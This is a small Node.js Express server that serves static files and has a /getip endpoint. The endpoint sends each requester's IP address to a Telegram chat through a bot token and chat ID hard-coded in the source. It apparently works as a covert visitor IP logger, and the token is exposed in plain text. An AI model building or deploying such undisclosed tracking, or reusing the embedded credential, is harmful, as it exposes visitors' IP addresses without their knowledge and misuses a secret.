const express = require('express');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '6683175234:AAFN2jLpa_b4eEcvS8XyvR2xamCOm7d19CI';
const TELEGRAM_CHAT_ID = '6096343790';

app.use(express.static('public'));

app.get('/getip', (req, res) => {
  const ip = req.ip;

  const message = `IP: ${ip}\n`;

  // Отправляем сообщение в Telegram
  sendTelegramMessage(message);

  res.json({ success: true });
});

function sendTelegramMessage(message) {
  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  fetch(telegramApiUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    }),
  })
    .then(response => response.json())
    .then(data => {
      console.log('Telegram response:', data);
    })
    .catch(error => console.error('Telegram error:', error));
}

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
